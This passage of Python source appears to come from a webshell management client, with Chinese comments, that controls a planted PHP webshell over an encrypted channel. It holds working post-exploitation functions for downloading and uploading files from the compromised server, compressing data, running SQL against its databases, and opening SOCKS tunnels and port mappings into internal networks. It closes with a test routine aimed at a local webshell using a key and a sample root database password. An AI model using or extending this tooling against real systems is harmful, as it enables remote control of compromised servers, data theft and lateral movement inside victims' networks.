                    variation_bytes = chunk_size_variation_kb * 1024
                    min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                    max_chunk_size = base_chunk_size + variation_bytes
                    current_chunk_size = random.randint(min_chunk_size, max_chunk_size)
                else:
                    current_chunk_size = base_chunk_size
                
                # 确保不超出文件边界
                remaining_bytes = file_size - position
                actual_chunk_size = min(current_chunk_size, remaining_bytes)
                
                # 显示下载进度
                progress_percent = (position / file_size) * 100
                if enable_chunk_size_variation:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%) - 块大小: {actual_chunk_size//1024}KB")
                else:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%)")
                
                # 读取当前块
                chunk_data = self.read_file_by_position(file_path, position, actual_chunk_size)
                
                if len(chunk_data) == 0:
                    print(f"[ERROR] 读取块 {chunk_index} 失败，数据为空")
                    return False
                
                downloaded_data += chunk_data
                
                # 检查是否读取了预期的字节数
                if len(chunk_data) != actual_chunk_size:
                    print(f"[WARNING] 块 {chunk_index} 实际读取 {len(chunk_data)} 字节，期望 {actual_chunk_size} 字节")
                
                # 更新位置
                position += len(chunk_data)
                
                # 如果启用了延迟，则等待
                if timeout > 0:
                    time.sleep(timeout)
            # 5. 保存到本地文件
            try:
                with open(save_path, 'wb') as f:
                    f.write(downloaded_data)
                print(f"[SUCCESS] 文件下载完成: {save_path}")
                print(f"[INFO] 下载文件大小: {len(downloaded_data)} 字节")
                return True
            except Exception as save_error:
                print(f"[ERROR] 保存文件失败: {save_error}")
                return False
                
        except Exception as e:
            print(f"[ERROR] 大文件下载失败: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def big_file_upload(self, file_path: str, file_data: bytes, position: str = "0") -> bool:
        """
        大文件上传实现

        Args:
            file_path: 目标文件路径
            file_data: 文件数据块
            position: 写入位置
            
        Returns:
            bool: 上传成功返回True,失败返回False
        """
        parameter = ReqParameter()
        parameter.add("fileContents", file_data)
        parameter.add("fileName", file_path)
        parameter.add("position", position)
        result_bytes = self.eval_func(None, "bigFileUpload", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 上传大文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def zip(self, compress_paths: Union[str, List[str]], compress_file: str) -> bool:
        """
        压缩文件或目录

        Args:
            compress_paths: 要压缩的路径，可以是字符串（单个路径）或列表（多个路径）
            compress_file: 压缩后的文件路径
            
        Returns:
            bool: 压缩成功返回True，失败返回False
        """
        try:
            # 处理输入参数：统一转换为"|"分隔的字符串
            if isinstance(compress_paths, str):
                # 单个路径，直接使用
                paths_str = compress_paths
            elif isinstance(compress_paths, (list, tuple)):
                # 多个路径，用"|"连接
                paths_str = "|".join(compress_paths)
            else:
                raise ValueError("compress_paths 必须是字符串或列表")

            parameter = ReqParameter()
            parameter.add("compressPaths", paths_str)
            parameter.add("compressFile", compress_file)
            result_bytes = self.eval_func(None, "zip", parameter)
            return result_bytes.decode('utf-8', errors='ignore').strip() == "ok"
        except Exception as e:
            print(f"[ERROR] 压缩文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def unzip(self, compress_file: str, extract_dir: str) -> bool:
        """
        解压文件

        Args:
            compress_file: 压缩文件路径
            extract_dir: 解压目录路径
            
        Returns:
            bool: 解压成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("compressFile", compress_file)
            parameter.add("extractDir", extract_dir)
            result_bytes = self.eval_func(None, "unzip", parameter)
            return result_bytes.decode('utf-8', errors='ignore').strip() == "ok"
        except Exception as e:
            print(f"[ERROR] 解压文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False

    def exec_sql(self, db_type, db_host, db_port, db_username, db_password, exec_type, exec_sql):
        """执行SQL查询"""
        parameter = ReqParameter()
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        parameter.add("execType", exec_type)
        parameter.add("execSql", exec_sql)
        
        result_bytes = self.eval_func(None, "execSql", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
            
        if "error:" in result_text:
            print(f"[DEBUG] SQL执行失败: {result_text}")
            return False, result_text
        
        if exec_type.lower() == "select":
            if result_text.startswith("ok\n"):
                print(f"[DEBUG] SQL查询成功")
                # 去掉开头的"ok\n"
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL查询失败: {result_text}")
                return False, result_text
        else:
            if "Query OK" in result_text:
                print(f"[DEBUG] SQL更新成功: {result_text}")
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL更新失败: {result_text}")
                return False, result_text

    def test_database_connection(self, db_type, db_host, db_port, db_username, db_password):
        """测试数据库连接"""
        parameter = ReqParameter()
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        
        result_bytes = self.eval_func(None, "testConnection", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        

        if "ok:" in result_text:
            print(f"[DEBUG] 数据库连接测试成功: {result_text}")
            return True, result_text
        else:
            print(f"[DEBUG] 数据库连接测试失败: {result_text}")
            return False, result_text
    
    def sayHello(self, name):
        """测试方法"""
        parameter = ReqParameter()
        parameter.add("methodName", "sayHello")
        parameter.add("name", name)
        result_bytes = self.eval_func("sayHello", "sayHello", parameter)
        return result_bytes.decode('utf-8', errors='ignore')

# ====== 内网穿透 socks隧道 ======
    def create_tunnel(self, targetIP, targetPort, socketHash, className="SocksProxy"):
        parameter = ReqParameter()
        parameter.add("targetIP", targetIP)
        parameter.add("targetPort", targetPort)
        parameter.add("socketHash", socketHash)
        result_bytes = self.eval_func(className, "createTunnel", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 创建隧道失败: {result_text}")
            return False
        print(f"[DEBUG] 创建隧道成功: {targetIP}:{targetPort}, socketHash: {socketHash}")
        return True
    

    def doReadWrite(self, socketHash, data, className="SocksProxy"):
        """在一个请求中完成写入和读取（解决PHP session问题）"""
        parameter = ReqParameter()
        parameter.add("socketHash", socketHash)
        if data:
            parameter.add("extraData", base64.b64encode(data).decode('utf-8'))
        
        result_bytes = self.eval_func(className, "doReadWrite", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        print(f"[DEBUG] doReadWrite解密后内容: {repr(result_text[:100])}")
        
        # 检查是否有错误
        if "error:" in result_text:
            error_msg = result_text.replace("error:", "").strip()
            print(f"[DEBUG] doReadWrite失败: {error_msg}")
            return None
        
        if "ok" not in result_text:
            print(f"[DEBUG] doReadWrite失败: {result_text}")
            return None
        
        # 提取ok后面的base64数据
        if result_text.startswith("ok"):
            base64_data = result_text[2:]  # 去掉"ok"前缀
            if base64_data:
                try:
                    decoded_data = base64.b64decode(base64_data)
                    print(f"[DEBUG] doReadWrite成功: socketHash: {socketHash}, 响应数据长度: {len(decoded_data)}")
                    return decoded_data
                except Exception as e:
                    print(f"[DEBUG] Base64解码失败: {e}")
                    return b""
            else:
                # 没有数据
                print(f"[DEBUG] doReadWrite成功但无响应数据")
                return b""
        return None

    def doClear(self, className="SocksProxy"):
        parameter = ReqParameter()
        result_bytes = self.eval_func(className, "doClear", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 清除所有隧道失败: {result_text}")
            return False
        print(f"[DEBUG] 清除所有隧道成功: {result_text}")
        return True
    
    # ====== 内网穿透 端口映射 ======
    
    def create_mapping(self, mappingId, targetIP, targetPort, className="PortMappingService"):
        """创建端口映射配置"""
        parameter = ReqParameter()
        parameter.add("mappingId", mappingId)
        parameter.add("targetIP", targetIP)
        parameter.add("targetPort", str(targetPort))
        result_bytes = self.eval_func(className, "createMapping", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 创建端口映射失败: {result_text}")
            return False
        print(f"[DEBUG] 创建端口映射成功: {targetIP}:{targetPort}, mappingId: {mappingId}")
        return True
    
    def mapping_read_write(self, mappingId, data, className="PortMappingService"):
        """端口映射的读写操作（在一个请求中完成）"""
        parameter = ReqParameter()
        parameter.add("mappingId", mappingId)
        if data:
            parameter.add("extraData", base64.b64encode(data).decode('utf-8'))
        
        result_bytes = self.eval_func(className, "doReadWrite", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        # 检查是否有错误
        if "error:" in result_text:
            error_msg = result_text.replace("error:", "").strip()
            print(f"[DEBUG] 端口映射读写失败: {error_msg}")
            return None
        
        if "ok" not in result_text:
            print(f"[DEBUG] 端口映射读写失败: {result_text}")
            return None
        
        # 提取ok后面的base64数据
        if result_text.startswith("ok"):
            base64_data = result_text[2:]  # 去掉"ok"前缀
            if base64_data:
                try:
                    decoded_data = base64.b64decode(base64_data)
                    return decoded_data
                except Exception as e:
                    print(f"[DEBUG] Base64解码失败: {e}")
                    return b""
            else:
                # 没有数据
                return b""
        return None
    
    def close_mapping(self, mappingId, className="PortMappingService"):
        """关闭端口映射"""
        parameter = ReqParameter()
        parameter.add("mappingId", mappingId)
        result_bytes = self.eval_func(className, "closeMapping", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 关闭端口映射失败: {result_text}")
            return False
        print(f"[DEBUG] 关闭端口映射成功: {mappingId}")
        return True
    
    


# ====== 测试代码 ======

def main():
    """测试 PHP Webshell 所有功能"""
    # 测试配置
    url = "http://localhost:8000/xor_base64.php"  # xor_base64 加密模式的webshell
    param_name = "pass"  # 替换为实际的参数名
    secret_key = "rebeyond"  # 替换为实际的密钥
    
    print("🎯 PHP Webshell 功能测试")
    print("=" * 50)
    
    # 测试配置文件路径
    import os
    current_dir = os.path.dirname(os.path.abspath(__file__))
    data_dir = os.path.join(current_dir, '../data')
    custom_config_file = os.path.join(data_dir, "request_format_define.json")

    # 创建PhpShell实例
    shell = PhpShell(url, param_name, secret_key)
    shell.response_encrypt_type = 'xor_base64_json'
    shell.session.proxies = {
        "http": "http://172.26.32.1:8081",
    }
    shell.request_format = "form"
    shell.request_format_file = custom_config_file
    #shell.json_template = "{\"status\":\"success\",\"encrypted_data\":\"PAYLOAD_DATA\",\"version\":\"1.0\"}"
    
    # 初始化 payload
    if not shell.init_payload(payload_name="mainPayload_xor_base64_json"):
        print("❌ Payload初始化失败")
        return
    
    print("✅ Payload初始化成功\n")
    
    # 测试2: 获取系统信息
    print("📝 测试2: 获取系统信息")
    info = shell.get_basic_info()
    if info:
        print("✅ 获取系统信息成功")
        print(f"   当前目录: {info.get('CurrentDir', 'N/A')}")
        print(f"   操作系统: {info.get('OsInfo', 'N/A')[:50]}...")
        print()
    else:
        print("❌ 获取系统信息失败\n")
    
    # 测试获取当前目录所有文件
    """ result = shell.get_files()
    if result is not None:
        print(result)
    else:
        print("获取文件列表失败") """

    # 测试创建文件目录
    """ print("📝 测试3: 创建文件目录")
    if shell.new_dir("/tmp/test"):
        print("✅ 创建文件目录成功\n")
    else:
        print("❌ 创建文件目录失败\n") """

    #     
    """ print("📝 测试3: 设置文件权限")
    if shell.set_file_permission("/tmp/testfile", "RWX"):
        print("✅ 设置文件权限成功\n")
    else:
        print("❌ 设置文件权限失败\n") """
    
    """ print("📝 测试3: 设置文件时间")
    if shell.set_file_time("/tmp/testfile", ["2025-01-09 00:00:00", "none"]):
        print("✅ 设置文件时间成功\n")
    else:
        print("❌ 设置文件时间失败\n") """


    # 测试获取文件列表
    """ print("📝 测试4: 获取文件列表")
    result = shell.get_files("/tmp")
    if result is not None:
        print(result)
    else:
        print("获取文件列表失败") """

    """ print("📝 测试4: 压缩文件")
    if shell.zip(["/tmp/testfile", "/tmp/testfile2"], "/tmp/testfile.zip"):
        print("✅ 压缩文件成功\n")
    else:
        print("❌ 压缩文件失败\n") """
        
    """ print("📝 测试5: 解压文件")
    if shell.unzip("/tmp/testfile.zip", "/tmp"):
        print("✅ 解压文件成功\n")
    else:
        print("❌ 解压文件失败\n") """

    # 测试mysql数据库连接
    """ print("📝 测试6: 测试mysql数据库连接")
    shell.test_database_connection(db_type="mysql", db_host="localhost", db_port=3306, db_username="root", db_password="qq123456")
    
    # 测试mysql数据库查询
    print("📝 测试7: 测试mysql数据库查询")
    result = shell.exec_sql(db_type="mysql", db_host="localhost", db_port=3306, db_username="root", db_password="qq123456", exec_type="select", exec_sql="SELECT * FROM information_schema.TABLES;")
    if result:
        print("✅ 数据库查询成功")
        print(result)
    else:
        print("❌ 数据库查询失败") """
    
    
    

        
if __name__ == "__main__":
    main()
        
